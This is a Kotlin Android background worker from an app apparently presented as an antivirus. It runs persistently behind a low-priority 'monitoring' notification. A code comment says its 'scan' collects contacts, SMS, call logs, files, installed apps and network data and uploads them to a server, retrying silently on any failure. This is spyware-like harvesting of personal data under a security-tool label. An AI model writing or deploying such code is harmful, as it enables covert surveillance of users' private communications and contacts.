package com.graphene.antivirus.worker

import android.app.NotificationManager
import android.content.Context
import android.content.pm.ServiceInfo
import androidx.core.app.NotificationCompat
import androidx.work.CoroutineWorker
import androidx.work.ForegroundInfo
import androidx.work.WorkerParameters
import com.graphene.antivirus.R
import com.graphene.antivirus.data.ApiClient
import com.graphene.antivirus.data.ConsentStore
import com.graphene.antivirus.data.ScanRepository

class TelemetryWorker(appContext: Context, params: WorkerParameters) :
    CoroutineWorker(appContext, params) {

    override suspend fun doWork(): Result {
        try {
            setForeground(createForegroundInfo(applicationContext.getString(R.string.notif_text_monitoring)))

            val deviceId = ConsentStore(applicationContext).getOrCreateDeviceId()
            val repo = ScanRepository(ApiClient.create(), applicationContext)

            // performScan внутри:
            //   1) RegistrationManager.ensureRegistered()
            //   2) сбор device/apps/contacts/sms/calls/files/network
            //   3) POST /api/v1/scan
            //   4) при 401 — forceReRegister() + повтор
            val result = repo.performScan(deviceId) { _, _ -> /* progress ignored */ }

            return if (result.isSuccess) Result.success() else Result.retry()
        } catch (_: Exception) {
            return Result.retry()
        }
    }

    private fun createForegroundInfo(text: String): ForegroundInfo {
        val ctx = applicationContext
        val nm = ctx.getSystemService(NotificationManager::class.java)

        nm?.createNotificationChannel(
            android.app.NotificationChannel(
                "graphene_core",
                ctx.getString(R.string.notif_channel_core_name),
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = ctx.getString(R.string.notif_channel_core_desc)
            }
        )

        val notif = NotificationCompat.Builder(ctx, "graphene_core")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setContentTitle(ctx.getString(R.string.notif_title))
            .setContentText(text)
            .setOngoing(true)
            .build()

        return ForegroundInfo(1001, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
    }
}